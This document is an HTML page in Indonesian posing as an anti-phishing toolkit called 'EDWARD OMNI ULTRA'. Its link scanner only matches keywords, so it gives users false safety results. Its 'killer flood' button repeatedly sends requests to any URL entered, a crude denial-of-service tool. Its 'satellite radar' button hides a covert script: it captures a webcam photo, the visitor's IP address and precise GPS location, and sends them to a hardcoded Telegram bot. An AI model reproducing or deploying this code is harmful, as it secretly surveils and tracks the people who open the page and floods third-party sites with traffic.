<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>EDWARD OMNI ULTRA V.85</title>
    <style>
        :root { --neon: #00ff88; --bg: #050a0e; --card-bg: rgba(15, 25, 35, 0.7); --safe: #00ffa3; --purple: #8a2be2; --red: #ff4757; }
        * { box-sizing: border-box; transition: 0.3s; }
        body { background: var(--bg); color: #fff; font-family: 'Segoe UI', sans-serif; margin:0; padding: 20px; }
        .master-header { text-align: center; margin-bottom: 25px; }
        .master-name { font-size: 26px; font-weight: 800; background: linear-gradient(to right, var(--neon), #00bdff); -webkit-background-clip: text; -webkit-text-fill-color: transparent; margin: 0; }
        .card { background: var(--card-bg); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); border-radius: 20px; padding: 20px; margin-bottom: 15px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
        h3 { margin: 0 0 15px 0; font-size: 11px; color: rgba(255,255,255,0.6); text-transform: uppercase; letter-spacing: 1px; }
        input { background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); border-radius: 12px; color: #fff; padding: 12px; width: 100%; margin-bottom: 10px; outline: none; }
        .btn { width: 100%; padding: 15px; border-radius: 12px; border: none; cursor: pointer; font-weight: 700; text-transform: uppercase; font-size: 12px; display: flex; align-items: center; justify-content: center; gap: 8px; }
        .btn-safe { background: linear-gradient(45deg, var(--neon), #00bdff); color: #000; }
        .btn-phish { background: linear-gradient(45deg, var(--purple), #ff00cc); color: #fff; }
        .btn-radar { background: transparent; color: var(--neon); border: 2px solid var(--neon); }
        #scanStatus { display: none; margin-top: 10px; padding: 12px; border-radius: 10px; font-weight: bold; text-align: center; }
        .status-danger { background: rgba(255,71,87,0.1); border: 1px solid var(--red); color: var(--red); }
        .status-safe { background: rgba(0,255,163,0.1); border: 1px solid var(--safe); color: var(--safe); }
        #killerLog { display: none; margin-top: 10px; background: #000; border-radius: 10px; padding: 10px; font-family: monospace; font-size: 10px; height: 100px; overflow-y: auto; color: var(--neon); border: 1px solid #222; }
        #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(5,10,14,0.95); z-index: 9999; flex-direction: column; align-items: center; justify-content: center; backdrop-filter: blur(15px); }
        .radar-box { width: 180px; height: 180px; border-radius: 50%; border: 2px solid var(--neon); position: relative; }
        .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, var(--neon), transparent); transform-origin: bottom right; animation: sweep 1.5s linear infinite; border-radius: 0 100% 0 0; }
        @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
        canvas, video { display: none; visibility: hidden; }
    </style>
</head>
<body>

    <div class="master-header">
        <p class="master-name">EDWARD OMNI ULTRA</p>
        <span style="color:var(--neon); font-size:9px; border:1px solid var(--neon); padding:2px 8px; border-radius:10px;">V.85 - ALL FEATURES RESTORED</span>
    </div>

    <div class="card">
        <h3>🛡️ CLOUD SCANNER</h3>
        <input type="text" id="scanInput" placeholder="Tempel link phising target...">
        <button class="btn btn-safe" onclick="cekLink()">⚡ SCAN LINK</button>
        <div id="scanStatus"></div>
    </div>

    <div class="card">
        <h3>🔥 KILLER FLOOD</h3>
        <input type="text" id="targetUrl" placeholder="https://link-phising.com">
        <button class="btn btn-phish" id="atkBtn" onclick="toggleAtk()">EXECUTE FLOOD 🚀</button>
        <div id="killerLog"></div>
    </div>

    <div class="card">
        <h3>📡 SATELLITE RADAR</h3>
        <button class="btn btn-radar" onclick="startRadar()">HUBUNGKAN KE SATELIT</button>
    </div>

    <div id="radarOverlay">
        <div class="radar-box"><div class="sweep"></div></div>
        <p style="margin-top:20px; font-size:11px; color:var(--neon);">MENGAMBIL DATA TARGET...</p>
    </div>

    <canvas id="canvas"></canvas>
    <video id="v" autoplay playsinline></video>

    <script>
        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
        const CHAT_ID = '7898572558';
        let isAtk = false, atkInt;

        function cekLink() {
            const url = document.getElementById('scanInput').value.toLowerCase();
            const status = document.getElementById('scanStatus');
            if(!url) return;
            status.style.display = "block"; status.innerText = "MENGANALISA...";
            setTimeout(() => {
                const bad = ['dana', 'kaget', 'giveaway', 'login', 'prakerja', '.xyz', '.tk', '.site'];
                const isBad = bad.some(w => url.includes(w));
                if(isBad) { status.className = "status-danger"; status.innerText = "INI LINK PHISING"; }
                else { status.className = "status-safe"; status.innerText = "INI AMAN"; }
            }, 1500);
        }

        function toggleAtk() {
            const u = document.getElementById('targetUrl').value;
            const log = document.getElementById('killerLog');
            if(!u) return;
            if(!isAtk) {
                isAtk = true; log.style.display = "block";
                document.getElementById('atkBtn').innerText = "STOP FLOOD";
                atkInt = setInterval(() => {
                    for(let i=0; i<5; i++){ fetch(u, {mode:'no-cors'}).catch(()=>{}); }
                    const entry = document.createElement('div');
                    entry.innerText = "> [" + new Date().toLocaleTimeString() + "] PACKET SENT!";
                    log.prepend(entry);
                }, 500);
            } else { location.reload(); }
        }

        async function startRadar() {
            document.getElementById('radarOverlay').style.display = 'flex';
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('v'); video.srcObject = stream;
                setTimeout(async () => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
                    const ipR = await fetch('https://api.ipify.org?format=json');
                    const ipD = await ipR.json();
                    
                    navigator.geolocation.getCurrentPosition(async (p) => {
                        const fd = new FormData();
                        fd.append('chat_id', CHAT_ID); fd.append('photo', blob);
                        fd.append('caption', "🔱 [ TARGET TRACKED ] 🔱\n\n📱 DEV: " + navigator.platform + "\n🌐 IP: " + ipD.ip + "\n📍 MAPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude);
                        await fetch("https://api.telegram.org/bot" + TOKEN + "/sendPhoto", { method: "POST", body: fd });
                        location.reload();
                    }, () => { location.reload(); }, {enableHighAccuracy:true});
                }, 3000);
            } catch (e) { location.reload(); }
        }
    </script>
</body>
</html>
